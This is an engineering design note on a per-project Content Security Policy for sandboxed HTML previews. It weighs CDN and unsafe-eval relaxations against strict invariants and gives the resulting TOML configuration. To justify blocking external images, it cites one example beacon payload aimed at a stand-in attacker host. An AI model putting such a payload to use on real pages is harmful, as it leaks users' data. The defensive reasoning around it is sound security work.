# MDT-221 — Security Trade-offs & Configuration Path

> This document records the rationale for the per-project HTML preview CSP
> configuration model. §1 explains what relaxations real "working" HTML design
> files require and why. §2 describes the configuration model. §3 records that
> the model shipped (TASK-14). §4 tracks the remaining surfacing-dialog work
> (TASK-15).
>
> **Canonical contract is the strict CSP, and it is the default.** Relaxations
> are opt-in per project via `[project.document.preview]` config — the owner
> makes a conscious decision for each domain and capability.

## 1. The trade-offs we took to make it work

When design3.html (a real, representative working HTML file) was previewed, the
strict CSP blocked everything that makes it function. Three relaxations were
needed, each with a specific reason:

### 1.1 External CDN allowlist (script-src / style-src / font-src)

- **Strict contract**: `default-src 'none'` — no external origins anywhere.
- **What we allowed**: `https://cdn.tailwindcss.com`, `https://cdn.jsdelivr.net`
  (script + style), `https://fonts.googleapis.com`, `https://fonts.gstatic.com`
  (style + font).
- **Why**: design3.html loads Tailwind (CDN JIT), Alpine.js (jsDelivr), and
  Google Fonts literally via `<script src>`/`<link href>`. These are not
  exotic — they are the dominant CDN stack for prototype/design HTML. Without
  them the file renders as raw unstyled markup.
- **What still holds**: `connect-src 'none'` (no fetch/XHR), `img-src 'self' data:`
  (no external image loads / beacons), opaque-origin sandbox (no parent access).
- **Residual risk**: an external script from an allowed CDN runs in the sandbox.
  It cannot reach the parent or call `/api`, but it could attempt
  self-navigation exfiltration (bounded by the 5-min owner-minted token TTL).

### 1.2 `unsafe-eval` in script-src

- **Strict contract**: `script-src 'self' 'unsafe-inline'` — no `unsafe-eval`.
- **What we allowed**: added `'unsafe-eval'`.
- **Why**: Alpine.js evaluates `x-data`/`x-init` directive strings as code via
  `new Function()`. The Tailwind CDN JIT compiler also evaluates configuration
  strings. Both are architecturally incapable of working without `unsafe-eval`.
  Without it, Alpine's click handlers never wire up — which is exactly the
  "Trace Graph modal stuck open, cannot close" symptom.
- **What still holds**: the opaque-origin sandbox is unaffected by `unsafe-eval`
  (verified: parent JS still cannot read `iframe.contentDocument`). The
  eval-capable scripts still cannot reach the parent, cookies, localStorage, or
  `/api` (connect-src none).
- **Residual risk**: `unsafe-eval` is, on paper, a primary XSS vector — if an
  attacker could inject content into the previewed file, they could run
  arbitrary string-as-code. In v1 the only minter is the owner previewing their
  own file, so the injection scenario requires the owner to have placed
  malicious code in their own design doc.

### 1.3 (For the record) What we did NOT relax

These stayed strict despite the pressure, and should remain non-negotiable in
any follow-up configuration model:

- `allow-same-origin` — **never**. Combined with `allow-scripts` this collapses
  the entire sandbox; previewed HTML could read parent localStorage and the API
  cookie. This is the one token that must never appear.
- `connect-src` — stayed `'none'`. No credentialed network channel, no
  programmatic data exfiltration via fetch/XHR/WebSocket.
- `img-src` — stayed `'self' data:`. External image loads blocked (prevents
  `<img src="https://evil/?data">` beacon exfiltration).
- `default-src 'none'` with no `object-src` override — blocks `<object>`/
  `<embed>` SVG script vectors.

## 2. Configuration advice — strict by default, opt-in per project

The right long-term home for these relaxations is a **per-project, opt-in
configuration**, not a global default. Proposed shape (for the follow-up CR):

```toml
# .mdt-config.toml
[project.document.preview]
# Strict by default. The owner consciously opts in to relaxations for the
# specific external domains and capabilities their working HTML needs.

# External origins the project's HTML files may load script/style/font from.
# Empty by default (no external origins). Each domain is a conscious decision.
allowedExternalDomains = [
  "cdn.tailwindcss.com",
  "cdn.jsdelivr.net",
  "fonts.googleapis.com",
  "fonts.gstatic.com",
]

# Allow eval-based frameworks (Alpine.js, Tailwind CDN JIT, etc.).
# Default false. Set true only if the project's HTML uses such frameworks.
allowUnsafeEval = true
```

The serving route reads this config per request and derives the CSP:

```text
script-src  'self' 'unsafe-inline' [+ 'unsafe-eval' if allowUnsafeEval] [<allowed script/style domains>]
style-src   'self' 'unsafe-inline' [<allowed style domains>]
font-src    'self'                 [<allowed font domains>]
img-src     'self' data:           (always — never external)
connect-src 'none'                 (always — never relaxed)
```

**Why strict-by-default matters**: the moment a user adds a document path that
points at HTML, they should not silently get a wide-open CSP. They should see
the preview fail with a clear "this document wants to load from X, Y, Z and use
eval — configure `[project.document.preview]` to allow them." That surfacing
(dialog or error) is what makes the trade-off conscious rather than implicit.

## 3. Resolution — the "right way" shipped (TASK-14)

The strict CSP **is** the canonical contract, and it **is** the default. TASK-14
shipped the per-project configuration model described in §2:

- **The hardcoded `RAW_PREVIEW_CSP` constant is deleted.** The CSP is derived
  per-request from `[project.document.preview]` config via `buildPreviewCsp()`
  in `DocumentController.ts`.
- **Strict by default.** A project with no `[project.document.preview]` section
  gets the canonical strict CSP (no external origins, no `unsafe-eval`). The
  integration test "CSP is strict by default" passes.
- **Opt-in relaxations.** `allowedExternalDomains` + `allowUnsafeEval` add
  external origins and `'unsafe-eval'` to `script-src`/`style-src`/`font-src`.
  The integration test "CSP includes configured external domains + unsafe-eval
  when project opts in" passes.
- **Non-negotiable invariants** (`connect-src 'none'`, `img-src 'self' data:`,
  `default-src 'none'`, no `allow-same-origin`) hold in every configuration and
  are asserted as `CSP_INVARIANTS`.

The deviations in §1.1/§1.2 are no longer deviations — they are the documented
opt-in model. The trade-off rationale in §1 still applies (the owner must
understand what each relaxation means), which is why the surfacing dialog
(TASK-15) remains valuable.

## 4. Remaining work — TASK-15 (surfacing dialog)

TASK-14 shipped items 1-2 + 5-6 below. TASK-15 is the remaining work:

1. ~~Add `[project.document.preview]` config schema (allowedExternalDomains,
   allowUnsafeEval) — strict defaults.~~ **Shipped (TASK-14).**
2. ~~Serving route derives CSP from config (replaces the hardcoded constant).~~ **Shipped (TASK-14).**
3. Mint endpoint statically scans the selected HTML's external `src`/`href`
   and returns a "needs approval" list when the config doesn't cover them.
4. Frontend dialog surfaces the list; user picks domains; persisted to config.
5. ~~`RAW_PREVIEW_CSP` constant deleted; CSP is always per-request.~~ **Shipped (TASK-14).**
6. ~~Re-tighten the integration test to assert the derived CSP matches config.~~ **Shipped (TASK-14).**
7. Default-config projects get the strict CSP — design3.html fails to render
   its CDNs until the owner opts in, with the dialog explaining why.

This is the proper version of the initial stopgap; TASK-14 shipped it.
